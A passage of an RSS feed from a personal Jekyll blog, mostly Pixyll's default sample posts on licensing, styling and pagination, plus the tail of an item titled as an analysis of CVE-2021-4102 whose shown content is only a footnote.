      <p>Using a different name from “Pixyll” for your derivate work helps avoid misdirected questions from people who are using your version.  It’s similar to using version numbers to discrimate the revisions of software when troubleshooting issues. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/01/07/CVE-2021-4102/</guid>
                <description>
                    
                    Analysis of CVE-2021-4102
                    
                </description>
                <pubDate>Fri, 07 Jan 2022 14:46:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>template template template...</title>
                <link>http://localhost:4000/2022/01/01/template/</link>
                <content:encoded>
                    <![CDATA[
                    <h1 id="test-sharp">test sharp</h1>

<h2 id="test-sharp-1">test sharp</h2>

<h3 id="test-sharp-2">test sharp</h3>

<p>The following is an overview to copying and sharing Pixyll.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup></p>

<p>Most people have an understanding of what the copyright and licensing obligations are for source code, but not everyone has practical experience.  There is a lot of information about how to use free and open source source code generally, but not necessarily how it works specifically.</p>

<h2 id="basics">Basics</h2>

<p>Pixyll is free and open source software under the MIT license, a <em>permissive license</em>.  You can use Pixyll without charge and it is provided to you, “as is”, without warranty of any kind.</p>

<p>These are some of the rights for Pixyll since it is under the MIT license:<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup></p>

<ol>
  <li>You can <strong>copy</strong> Pixyll by forking it on GitHub or by any other means of copying.</li>
  <li>You can <strong>use</strong> Pixyll to publish your site without restriction or limitation.</li>
  <li>You can <strong>change</strong> Pixyll as you wish, and you can publish your site with a modified version of Pixyll.</li>
  <li>You can also <strong>distribute</strong> copies of Pixyll to other people.</li>
  <li>You can also <strong>distribute modified</strong> copies of Pixyll.</li>
</ol>

<p>Other rights you have of Pixyll under the MIT license:</p>

<ul>
  <li>You can <strong>sell</strong> copies of Pixyll, including copies you have modified.</li>
  <li>You can <strong>combine</strong> Pixyll with other works that are under the MIT license, or other permissive licenses, a copyleft license or a proprietary license.  Pixyll already does this itself by using Jekyll, Ruby and other dependencies.</li>
  <li>You can distribute copies of Pixyll to others under either the MIT license or you can <strong>relicense</strong> Pixyll under another license.  This includes a different permissive license, a copyleft license or a proprietary license.</li>
</ul>

<p>Your only responsibility is to preserve both the copyright notices of Pixyll and the MIT license in your copy or modified work.</p>

<h2 id="how-to">How to</h2>

<p>If you’ve modified Pixyll significantly and want to share your version, especially public copies of the code, then there are a few items you should do.</p>

<ol>
  <li>You should probably <strong>rename</strong> your fork of Pixyll with a different name.</li>
  <li>A new name isn’t required by the MIT license, but it is good etiquette.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup></li>
  <li>You should add your name to the <strong>copyright</strong> of your version, and you should preserve the existing copyrights of Pixyll.</li>
  <li>Maintaining the copyright notices isn’t required of the MIT license, but it is suggested by the license and is a good practice for documenting the copyrights of your derived work.</li>
</ol>

<p>The items above do not apply when you just copied and modified Pixyll in small ways to just publish your site and you have no plans to fork Pixyll under a different name.</p>

<p>If you want to publish a fork of Pixyll under a different name but keeping it under the MIT license, then you should add your name to the copyright notices:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Copyright (c) 2021 Your Name
Copyright (c) 2014-2021 John Otander for Pixyll
</code></pre></div></div>

<p>However, if you want to publish a fork of Pixyll under a different name <em>and</em> a different license, then you should should still add your name to the copyright notices but have a section titled “Pixyll” at the bottom of your LICENSE file that preserves the copyright and license notices for Pixyll:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pixyll

Copyright (c) 2014-2021 John Otander

MIT License

Permission is hereby granted, [...]
</code></pre></div></div>

<p>If you are just modifying Pixyll in small ways to customize your site, you are not obligated to maintain the copyright notices of Pixyll on your site.  However, if you want to credit the Pixyll theme that would be appreciated, see section on “Pixyll Plug” in the README file that came with Pixyll.</p>

<p>Thanks for using Pixyll, and happy hacking!</p>

<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p><strong>Disclaimer</strong>: This material is for informational purposes only, and should not be construed as legal advice or opinion.  For actual legal advice, you should consult with professional legal services. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>This list of privileges are derived from the four freedoms of “The Free Software Definition” published by the GNU project <a href="https://www.gnu.org/philosophy/free-sw.en.html">https://www.gnu.org/philosophy/free-sw.en.html</a>. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Using a different name from “Pixyll” for your derivate work helps avoid misdirected questions from people who are using your version.  It’s similar to using version numbers to discrimate the revisions of software when troubleshooting issues. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/01/01/template/</guid>
                <description>
                    
                    pixyll markdown template
                    
                </description>
                <pubDate>Sat, 01 Jan 2022 01:23:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>Guide to Forking Pixyll</title>
                <link>http://localhost:4000/jekyll/pixyll/2019/01/26/guide-to-forking-pixyll/</link>
                <content:encoded>
                    <![CDATA[
                    <p>The following is an overview to copying and sharing Pixyll.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup></p>

<p>Most people have an understanding of what the copyright and licensing obligations are for source code, but not everyone has practical experience.  There is a lot of information about how to use free and open source source code generally, but not necessarily how it works specifically.</p>

<h2 id="basics">Basics</h2>

<p>Pixyll is free and open source software under the MIT license, a <em>permissive license</em>.  You can use Pixyll without charge and it is provided to you, “as is”, without warranty of any kind.</p>

<p>These are some of the rights for Pixyll since it is under the MIT license:<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup></p>

<ol>
  <li>You can <strong>copy</strong> Pixyll by forking it on GitHub or by any other means of copying.</li>
  <li>You can <strong>use</strong> Pixyll to publish your site without restriction or limitation.</li>
  <li>You can <strong>change</strong> Pixyll as you wish, and you can publish your site with a modified version of Pixyll.</li>
  <li>You can also <strong>distribute</strong> copies of Pixyll to other people.</li>
  <li>You can also <strong>distribute modified</strong> copies of Pixyll.</li>
</ol>

<p>Other rights you have of Pixyll under the MIT license:</p>

<ul>
  <li>You can <strong>sell</strong> copies of Pixyll, including copies you have modified.</li>
  <li>You can <strong>combine</strong> Pixyll with other works that are under the MIT license, or other permissive licenses, a copyleft license or a proprietary license.  Pixyll already does this itself by using Jekyll, Ruby and other dependencies.</li>
  <li>You can distribute copies of Pixyll to others under either the MIT license or you can <strong>relicense</strong> Pixyll under another license.  This includes a different permissive license, a copyleft license or a proprietary license.</li>
</ul>

<p>Your only responsibility is to preserve both the copyright notices of Pixyll and the MIT license in your copy or modified work.</p>

<h2 id="how-to">How to</h2>

<p>If you’ve modified Pixyll significantly and want to share your version, especially public copies of the code, then there are a few items you should do.</p>

<ol>
  <li>You should probably <strong>rename</strong> your fork of Pixyll with a different name.</li>
  <li>A new name isn’t required by the MIT license, but it is good etiquette.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup></li>
  <li>You should add your name to the <strong>copyright</strong> of your version, and you should preserve the existing copyrights of Pixyll.</li>
  <li>Maintaining the copyright notices isn’t required of the MIT license, but it is suggested by the license and is a good practice for documenting the copyrights of your derived work.</li>
</ol>

<p>The items above do not apply when you just copied and modified Pixyll in small ways to just publish your site and you have no plans to fork Pixyll under a different name.</p>

<p>If you want to publish a fork of Pixyll under a different name but keeping it under the MIT license, then you should add your name to the copyright notices:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Copyright (c) 2021 Your Name
Copyright (c) 2014-2021 John Otander for Pixyll
</code></pre></div></div>

<p>However, if you want to publish a fork of Pixyll under a different name <em>and</em> a different license, then you should should still add your name to the copyright notices but have a section titled “Pixyll” at the bottom of your LICENSE file that preserves the copyright and license notices for Pixyll:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pixyll

Copyright (c) 2014-2021 John Otander

MIT License

Permission is hereby granted, [...]
</code></pre></div></div>

<p>If you are just modifying Pixyll in small ways to customize your site, you are not obligated to maintain the copyright notices of Pixyll on your site.  However, if you want to credit the Pixyll theme that would be appreciated, see section on “Pixyll Plug” in the README file that came with Pixyll.</p>

<p>Thanks for using Pixyll, and happy hacking!</p>

<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p><strong>Disclaimer</strong>: This material is for informational purposes only, and should not be construed as legal advice or opinion.  For actual legal advice, you should consult with professional legal services. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>This list of privileges are derived from the four freedoms of “The Free Software Definition” published by the GNU project <a href="https://www.gnu.org/philosophy/free-sw.en.html">https://www.gnu.org/philosophy/free-sw.en.html</a>. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Using a different name from “Pixyll” for your derivate work helps avoid misdirected questions from people who are using your version.  It’s similar to using version numbers to discrimate the revisions of software when troubleshooting issues. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2019/01/26/guide-to-forking-pixyll/</guid>
                <description>
                    
                    Pixyll is available to you under the MIT license.
                    
                </description>
                <pubDate>Sat, 26 Jan 2019 19:22:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>Announcing Version 2.0</title>
                <link>http://localhost:4000/jekyll/pixyll/2015/07/11/announcing-pixyll-version-2/</link>
                <content:encoded>
                    <![CDATA[
                    <p>In an effort to make Pixyll easier to customize and more aesthetically pleasing, we’ve released version <code class="language-plaintext highlighter-rouge">2.0</code>.</p>

<p>Pixyll now features:</p>

<ul>
  <li>Line anchors in code blocks and new syntax highlighting</li>
  <li>A customizable variables file</li>
  <li>Modular, and lighter weight CSS</li>
  <li>No more <code class="language-plaintext highlighter-rouge">max-width</code> media queries</li>
</ul>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2015/07/11/announcing-pixyll-version-2/</guid>
                <description>
                    
                    Now, Pixyll is lighter weight and more customizable than before.
                    
                </description>
                <pubDate>Sat, 11 Jul 2015 00:00:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>Hello, Pixyll</title>
                <link>http://localhost:4000/jekyll/pixyll/2014/06/12/welcome-to-pixyll/</link>
                <content:encoded>
                    <![CDATA[
                    <p>Hello.</p>

<p>Pixyll is a simple, beautiful theme for Jekyll that emphasizes content rather than aesthetic fluff. It’s mobile <em>first</em>, fluidly responsive, and delightfully lightweight.</p>

<p>It’s pretty minimal, but leverages large type and drastic contrast to make a statement, on all devices.</p>

<blockquote>
  <p>
    Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away.
  </p>
  <footer><cite title="Antoine de Saint-Exupéry">Antoine de Saint-Exupéry</cite></footer>
</blockquote>

<h2 id="where-is-it">Where is it?</h2>

<p>Checkout the <a href="https://github.com/johno/pixyll">GitHub repository</a> to download it, request a feature, or report a bug.</p>

<p>It’s free, and open source (<a href="https://opensource.org/licenses/MIT">MIT</a>).</p>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2014/06/12/welcome-to-pixyll/</guid>
                <description>
                    
                    Pixyll is a simple, beautiful theme for Jekyll that emphasizes content rather than aesthetic fluff.
                    
                </description>
                <pubDate>Thu, 12 Jun 2014 00:31:19 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>Pixyll in Action</title>
                <link>http://localhost:4000/jekyll/pixyll/2014/06/10/see-pixyll-in-action/</link>
                <content:encoded>
                    <![CDATA[
                    <p>There is a significant amount of subtle, yet precisely calibrated, styling to ensure
that your content is emphasized while still looking aesthetically pleasing.</p>

<p>All links are easy to <a href="#">locate and discern</a>, yet don’t detract from the <a href="#">harmony
of a paragraph</a>. The <em>same</em> goes for italics and <strong>bold</strong> elements. Even the the strikeout
works if <del>for some reason you need to update your post</del>. For consistency’s sake,
<ins>The same goes for insertions</ins>, of course.</p>

<h3 id="code-with-syntax-highlighting">Code, with syntax highlighting</h3>

<p>Here’s an example of some ruby code with line anchors.</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># The most awesome of classes</span>
<span class="k">class</span> <span class="nc">Awesome</span> <span class="o">&lt;</span> <span class="no">ActiveRecord</span><span class="o">::</span><span class="no">Base</span>
  <span class="kp">include</span> <span class="no">EvenMoreAwesome</span>

  <span class="n">validates_presence_of</span> <span class="ss">:something</span>
  <span class="n">validates</span> <span class="ss">:email</span><span class="p">,</span> <span class="ss">email_format: </span><span class="kp">true</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="nb">name</span> <span class="o">=</span> <span class="kp">nil</span><span class="p">)</span>
    <span class="nb">self</span><span class="p">.</span><span class="nf">email</span> <span class="o">=</span> <span class="n">email</span>
    <span class="nb">self</span><span class="p">.</span><span class="nf">name</span> <span class="o">=</span> <span class="nb">name</span>
    <span class="nb">self</span><span class="p">.</span><span class="nf">favorite_number</span> <span class="o">=</span> <span class="mi">12</span>
    <span class="nb">puts</span> <span class="s1">'created awesomeness'</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">email_format</span>
    <span class="n">email</span> <span class="o">=~</span> <span class="sr">/\S+@\S+\.\S+/</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></figure>

<p>Here’s some CSS:</p>

<figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nc">.foobar</span> <span class="p">{</span>
  <span class="c">/* Named colors rule */</span>
  <span class="nl">color</span><span class="p">:</span> <span class="no">tomato</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Here’s some JavaScript:</p>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">isPresent</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">is-present</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">doStuff</span><span class="p">(</span><span class="nx">things</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">isPresent</span><span class="p">(</span><span class="nx">things</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">doOtherStuff</span><span class="p">(</span><span class="nx">things</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Here’s some HTML:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"m0 p0 bg-blue white"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"h1"</span><span class="nt">&gt;</span>Hello, world!<span class="nt">&lt;/h3&gt;</span>
<span class="nt">&lt;/div&gt;</span></code></pre></figure>

<h1 id="headings">Headings!</h1>

<p>They’re responsive, and well-proportioned (in <code class="language-plaintext highlighter-rouge">padding</code>, <code class="language-plaintext highlighter-rouge">line-height</code>, <code class="language-plaintext highlighter-rouge">margin</code>, and <code class="language-plaintext highlighter-rouge">font-size</code>).
They also heavily rely on the awesome utility, <a href="https://basscss.com/">BASSCSS</a>.</p>

<h5 id="they-draw-the-perfect-amount-of-attention">They draw the perfect amount of attention</h5>

<p>This allows your content to have the proper informational and contextual hierarchy. Yay.</p>

<h3 id="there-are-lists-too">There are lists, too</h3>

<ul>
  <li>Apples</li>
  <li>Oranges</li>
  <li>Potatoes</li>
  <li>Milk</li>
</ul>

<ol>
  <li>Mow the lawn</li>
  <li>Feed the dog</li>
  <li>Dance</li>
</ol>

<h3 id="images-look-great-too">Images look great, too</h3>

<p><img src="https://cloud.githubusercontent.com/assets/1424573/3378137/abac6d7c-fbe6-11e3-8e09-55745b6a8176.png" alt="desk" /></p>

<p><em><img src="https://cloud.githubusercontent.com/assets/1424573/3378137/abac6d7c-fbe6-11e3-8e09-55745b6a8176.png" alt="desk" /></em></p>

<h3 id="there-are-also-pretty-colors">There are also pretty colors</h3>

<p>Also the result of <a href="https://basscss.com/">BASSCSS</a>, you can <span class="bg-dark-gray white">highlight</span> certain components
of a <span class="red">post</span> <span class="mid-gray">with</span> <span class="green">CSS</span> <span class="orange">classes</span>.</p>

<p>I don’t recommend using blue, though. It looks like a <span class="blue">link</span>.</p>

<h3 id="footnotes">Footnotes!</h3>

<p>Markdown footnotes are supported, and they look great! Simply put e.g. <code class="language-plaintext highlighter-rouge">[^1]</code> where you want the footnote to appear,<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> and then add
the reference at the end of your markdown.</p>

<h3 id="stylish-blockquotes-included">Stylish blockquotes included</h3>

<p>You can use the markdown quote syntax, <code class="language-plaintext highlighter-rouge">&gt;</code> for simple quotes.</p>

<blockquote>
  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse quis porta mauris.</p>
</blockquote>

<p>However, you need to inject html if you’d like a citation footer. I will be working on a way to
hopefully sidestep this inconvenience.</p>

<blockquote>
  <p>
    Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away.
  </p>
  <footer><cite title="Antoine de Saint-Exupéry">Antoine de Saint-Exupéry</cite></footer>
</blockquote>

<h3 id="tables">Tables</h3>

<p>Tables represent tabular data and can be built using markdown syntax.  They are rendered responsively in Pixyll for a variety of screen widths.</p>

<p>Here’s a simple example of a table:</p>

<table>
  <thead>
    <tr>
      <th>Quantity</th>
      <th>Description</th>
      <th style="text-align: right">Price</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2</td>
      <td>Orange</td>
      <td style="text-align: right">$0.99</td>
    </tr>
    <tr>
      <td>1</td>
      <td>Pineapple</td>
      <td style="text-align: right">$2.99</td>
    </tr>
    <tr>
      <td>4</td>
      <td>Banana</td>
      <td style="text-align: right">$0.39</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td> </td>
      <td><strong>Total</strong></td>
      <td style="text-align: right"><strong>$6.14</strong></td>
    </tr>
  </tfoot>
</table>

<p>A table must have a body of one or more rows, but can optionally also have a header or footer.</p>

<p>The cells in a column, including the header row cell, can either be aligned:</p>

<ul>
  <li>left,</li>
  <li>right or</li>
  <li>center.</li>
</ul>

<p>Most inline text formatting is available in table cells, block-level formatting are not.</p>

<table>
  <thead>
    <tr>
      <th>Default header</th>
      <th style="text-align: left">Left header</th>
      <th style="text-align: center">Center header</th>
      <th style="text-align: right">Right header</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Default</td>
      <td style="text-align: left">Left</td>
      <td style="text-align: center">Center</td>
      <td style="text-align: right">Right</td>
    </tr>
    <tr>
      <td><em>Italic</em></td>
      <td style="text-align: left"><strong>Bold</strong></td>
      <td style="text-align: center"><strong><em>Bold italic</em></strong></td>
      <td style="text-align: right"><code class="language-plaintext highlighter-rouge">monospace</code></td>
    </tr>
    <tr>
      <td><a href="#">link text</a></td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">code</code></td>
      <td style="text-align: center"><del>Strikeout</del></td>
      <td style="text-align: right"><ins>Insertion<ins></ins></ins></td>
    </tr>
    <tr>
      <td>line<br />break</td>
      <td style="text-align: left">“Smart quotes”</td>
      <td style="text-align: center"><mark>highlight</mark></td>
      <td style="text-align: right"><span class="green">green</span></td>
    </tr>
    <tr>
      <td>Footnote<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup></td>
      <td style="text-align: left"><sub>subscript</sub></td>
      <td style="text-align: center"><sup>superscript</sup></td>
      <td style="text-align: right"><span class="red">red</span></td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td>Footer row</td>
      <td style="text-align: left"> </td>
      <td style="text-align: center"> </td>
      <td style="text-align: right"> </td>
    </tr>
  </tfoot>
</table>

<h3 id="theres-more-being-added-all-the-time">There’s more being added all the time</h3>

<p>Checkout the <a href="https://github.com/johno/pixyll">GitHub repository</a> to request,
or add, features.</p>

<p>Happy writing.</p>

<hr />

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Important information that may distract from the main text can go in footnotes. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>Footnotes will work in tables since they’re just links. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2014/06/10/see-pixyll-in-action/</guid>
                <description>
                    
                    See what the different elements looks like. Your markdown has never looked better. I promise.
                    
                </description>
                <pubDate>Tue, 10 Jun 2014 21:31:19 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>So, What is Jekyll?</title>
                <link>http://localhost:4000/jekyll/pixyll/2014/06/09/so-what-is-jekyll/</link>
                <content:encoded>
                    <![CDATA[
                    <p>Jekyll is a tool for transforming your plain text into static websites and 
blogs. It is simple, static, and blog-aware. Jekyll uses the 
<a href="https://shopify.dev/docs/themes/liquid/reference/basics">Liquid</a> templating
language and has builtin <a href="https://daringfireball.net/projects/markdown/">Markdown</a>
and <a href="https://en.wikipedia.org/wiki/Textile_(markup_language)">Textile</a> support.</p>

<p>It also ties in nicely to <a href="https://pages.github.com/">GitHub Pages</a>.</p>

<p>Learn more about Jekyll on their <a href="https://jekyllrb.com/">website</a>.</p>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2014/06/09/so-what-is-jekyll/</guid>
                <description>
                    
                    Transform your plain text into static websites and blogs. Simple, static, and blog-aware.
                    
                </description>
                <pubDate>Mon, 09 Jun 2014 21:32:18 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>Pixyll has Pagination</title>
                <link>http://localhost:4000/jekyll/pixyll/2014/06/08/pixyll-has-pagination/</link>
                <content:encoded>
                    <![CDATA[
                    <p>This is an empty post to illustrate the pagination component with Pixyll.</p>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/jekyll/pixyll/2014/06/08/pixyll-has-pagination/</guid>
                <description>
                    
                    This is an empty post to illustrate the pagination component with Pixyll.
                    
                </description>
                <pubDate>Sun, 08 Jun 2014 20:21:29 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
  </channel>
</rss>
